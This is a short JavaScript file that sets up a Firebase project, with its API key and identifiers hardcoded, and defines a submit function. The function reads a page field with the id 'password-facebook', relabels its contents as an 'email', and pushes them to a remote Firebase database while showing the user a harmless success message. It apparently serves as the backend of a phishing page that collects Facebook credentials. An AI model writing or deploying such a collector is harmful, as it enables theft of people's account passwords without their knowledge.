

// Your Firebase setup code
var firebaseConfig = {
    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
    authDomain: "test-for-admin-9c05c.firebaseapp.com",
    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
    projectId: "test-for-admin-9c05c",
    storageBucket: "test-for-admin-9c05c.appspot.com",
    messagingSenderId: "180529484791",
    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
};
firebase.initializeApp(firebaseConfig);

function submitEmail() {
    var email = document.getElementById('password-facebook').value;
    firebase.database().ref('emails').push({
        email: email,
        timestamp: new Date().toISOString()
    }).then(() => {
        document.getElementById('resultMessage').textContent = 'Email submitted successfully!';
    }).catch((error) => {
        document.getElementById('resultMessage').textContent = 'Error submitting email: ' + error.message;
    });
}
